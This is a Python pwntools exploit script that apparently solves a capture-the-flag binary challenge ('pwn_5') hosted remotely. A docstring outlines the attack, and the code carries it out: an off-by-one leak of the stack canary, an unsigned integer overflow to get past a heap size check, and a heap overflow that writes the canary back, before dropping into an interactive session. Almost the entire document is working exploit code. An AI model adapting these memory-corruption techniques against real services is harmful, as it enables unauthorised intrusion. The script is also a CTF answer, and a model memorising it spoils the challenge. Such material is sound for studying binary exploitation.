'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable

1. input name off-by-one to leak canary
2. unsigned int overflow to bypass heap size limit
3. heap overflow to overwrite chunks and set the value to canary
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", "25307" 
filename = "./pwn_5"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B():
    gdb.attach(io)
    pause()

def pwn():
    # leak canary
    payload = b'f' * 9
    io.sendafter(b'who are u?\n', payload)
    io.recvuntil(b'f' * 9)
    # canary low byte is 0x00
    canary_value = u64(io.recv(7).rjust(8, b'\x00'))
    log.info(f'canary_value: {hex(canary_value)}')
    
    # unsigned int overflow to bypass heap size limit
    payload = cyclic(12) + p64(0) + p64(0x0000020D51) + p64(canary_value) + b'\x00' * 8
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'length: ', b'0')
    io.sendlineafter(b'name: ', payload) # chunk overflow

    # set canary
    payload = p64(canary_value)[4:] + b'\x00' * 8
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'length: ', b'12')
    io.sendafter(b'name: ', payload)
    
    payload = p64(canary_value)[4:] + b'\x00' * 4
    io.sendlineafter(b'> ', b'2')
    # B()
    io.sendafter(b'data: ', payload)
    

if __name__ == "__main__":
    pwn()
    io.interactive()
